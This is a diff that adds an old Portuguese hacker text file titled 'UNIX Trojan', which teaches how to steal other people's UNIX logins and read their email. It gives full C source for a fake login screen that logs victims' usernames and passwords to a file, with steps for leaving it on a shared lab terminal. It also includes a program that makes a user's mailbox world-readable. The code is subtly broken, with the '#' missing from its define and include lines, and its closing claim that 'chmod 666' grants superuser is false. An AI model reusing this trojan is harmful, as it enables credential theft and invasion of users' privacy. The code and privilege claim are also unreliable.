@@ -1,0 +1,208 @@
+<<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>>
+
+                         7***(()UNIX TROJAN())***7
+
+                                     by
+
+                                    Draco
+
+           "SEGURANÇA NO UNIX" é apenas um sonho. Este é um sistema fácil de
+           se quebrar (o melhor de tudo é que numca vai dar HANG UP depois
+           da terceira tentativa de se logar). Uma vez você estando no
+           sistema, você pode fazer o que quiser para melhor se informar
+           deem uma olhadinha no artigo da Phrack que diz "UNIX Nasty Tricks"
+           onde existe um código em C que quebra fácilmente toda precaria
+           segurança do sistema.
+
+           O que você precisa ter?
+
+           Você precisa de um account em um sistema UNIX. Também pode ser uma
+           versao do UNIX 4.2 ou um sistema AT&T V. Precisa executar na
+           maquina um PDP/11, VAX Pyramid para um melhor resultado.
+
+           NOTAS
+
+           O que esta por vir foi baseado em um artigo que saiu na Phrack em
+           abril de 86 entitulado "MAKING UNIX SECURE" .
+
+           Primeira parte: Atrás dos Passwords
+
+           Você pode implementar com um conhecimento minimo em UNIX e C. Você
+           precisa acessar um terminal onde poucas pessoas o usam, o
+           laboratorio da sua escola por exemplo.
+
+           Quando você entra no UNIX você vera primeiramente isto:
+
+           Tiburon System 4.2 bsd /System V (shark)
+
+           login: shark
+           password:
+
+           O programa que eu peguei simula uma sequencia de logon. Você roda
+           o programa no terminal.  Você terá de dar o login e o password
+           para entrar. O sistema diz para você "login and password incorrect"
+           e depois pergunta o login novamente
+
+           A segunda vez é o programa real de login.
+
+           Coloque no sistema o arquivo 'horse.c'.
+           Você precisara modificar as 8 primeiras linhas no seu sistema.
+
+--------------------Corta
+
+/* this is what a 'C' comment looks like.  You can leave them out. */
+
+/* define's are like macros you can use for configuration. */
+
+define SYSTEM "\n\nTiburon Systems 4.2bsd UNIX (shark)\n\n"
+
+/* The above string should be made to look like the message that your
+ * system prints when ready.  Each \n represents a carriage return.
+ */
+
+define LOGIN  "login: "
+
+/* The above is the login prompt.  You shouldn't have to change it
+ * unless you're running some strange version of UNIX.
+ */
+
+define PASSWORD "password:"
+
+/* The above is the password prompt.  You shouldn't have to change
+ * it, either.
+ */
+
+define WAIT 2
+
+/* The numerical value assigned to WAIT is the delay you get after
+ * "password:" and before "login incorrect."  Change it (0 = almost
+ * no delay, 5 = LONG delay) so it looks like your system's delay.
+ * realism is the key here - we don't want our target to become
+ * suspicious.
+ */
+
+
+define INCORRECT "Login incorrect.\n"
+
+/* Change the above so it is what your system says when an incorrect
+ * login is given.  You shouldn't have to change it.
+ */
+
+define FILENAME "stuff"
+
+/* FILENAME is the name of the file that the hacked passwords will
+ * be put into automatically.  'stuff' is a perfectly good name.
+ */
+
+/* Don't change the rest of the program unless there is a need to
+ * and you know 'C'.
+ */
+
+include <curses.h>
+include <signal.h>
+int stop();
+
+main()
+{
+char name[10], password[10];
+int i;
+FILE *fp, *fopen();
+signal(SIGINT,stop);
+initscr();
+printf(SYSTEM);
+printf(LOGIN);
+scanf("%[^\n]",name);
+getchar();
+noecho();
+printf(PASSWORD);
+scanf("%[^\n]",password);
+printf("\n");
+getchar();
+echo();
+sleep(WAIT);
+
+
+if ( ( fp = fopen(FILENAME,"a") )  != NULL ) {
+fprintf(fp,"login %s has password %s\n",name,password);
+fclose(fp);
+}
+
+printf(INCORRECT);
+endwin();
+}
+
+stop()
+{
+endwin();
+exit(0);
+}
+
+--------------Corta
+
+           Agora o seu sistema aparecera com a sequencia do login original.
+           Compile o programa 'horse.c'.
+           
+           Agora você trabalhara o codigo do objeto no arquivo 'horse'. Rode
+           ele e nao olhe  a sequencia do logon, re-edit o 'horse.c' e
+           re-compile o. Quando você estiver lendo para colocar o programa
+           em uso, crie um novo arquivo e chame 'trap' você  tera dois
+           comandos:
+
+           horse (para rodar seu programa)
+           login (para rodar o programa real e login)
+
+           Para executar 'trap' digite:
+
+           %source 'trap' (nao digite o %)
+
+           Vá para seu terminal.
+           Depois de você rodar com sucesso em poucas vezes cheque seus
+           arquivos 'stuff' e BINGO hack, hack, hack, hack vejam só:
+
+           user john has password secret
+           user mary has password smega
+
+           Copie os passwords ou use o comando get ou > sei lá se vira.
+
+Segunda Parte: Lendo E-MAIL[]'S
+
+           Quando o carinha roda um programa de ler e-mail, o processo cria
+           um arquivinho que mais tarde é deletado.
+
+           Quando a pessoa salva um e-mail velho ela pega no sistema UNIX,
+           e coloca o arquivo no mbox e no seu diretorio. Este arquivo pode
+           ser lido mas é impossivel para alguem  sem o 'owner' . Este
+           programa abre (i.e. chmod777, da para alguem o sistema para
+           escrever e ler) o mbox.
+
+---------------Corta
+
+include <pwd.h>
+
+struct passwd *getpwnam(name);
+struct passwd *p;
+char buf[255];
+
+main()
+{
+p = getpwnam(getlogin());
+sprintf(buf,"%s/%s",p->pw_dir,"mbox");
+if ( access(buf,0) > -1 ) {
+        sprintf(buf,"chmod 777 %s/%s",p->pw_dir,"mbox");
+        system(buf);
+        }
+}
+
+----------Corta
+
+           Terceira Parte: Super Usuario
+
+           Este pequeno comando faz com que qualquer comando possa ser
+           executado dentro do UNIX ou seja você será um Super Usuario.
+
+           Se bem que em muitos servers este erro já foi concertado fica
+           valendo mais como conhecimento.
+
+           "chmod 666 "comando""
+
+<<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>>
